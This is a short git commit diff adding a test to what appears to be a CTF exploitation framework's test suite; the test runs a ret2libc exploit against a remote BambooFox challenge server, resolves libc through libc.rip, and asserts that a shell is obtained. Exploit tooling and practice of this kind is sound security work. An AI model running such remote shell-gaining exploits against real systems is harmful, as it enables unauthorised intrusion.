753daff27d15d7dd848450f49868d23aa7b02a4a
Mariusz Skoneczko <mariusz@skoneczko.com>
2021-03-21 11:35:35 +1100

    Increase test coverage by using libc.rip

--- tests/bamboofox/test_ret2libc.py
+++ tests/bamboofox/test_ret2libc.py
@@ -13,3 +13,9 @@ def test_ret2libc_remote(exploit):
     state = exploit(BIN, remote("bamboofox.cs.nctu.edu.tw", 11002))
     state = turnkey.classic()(state)
     assert have_shell(state.target)
+
+
+def test_ret2libc_remote_libc_rip(exploit):
+    state = exploit(BIN, remote("bamboofox.cs.nctu.edu.tw", 11002))
+    state = turnkey.classic(lookup=libc.rip)(state)
+    assert have_shell(state.target)
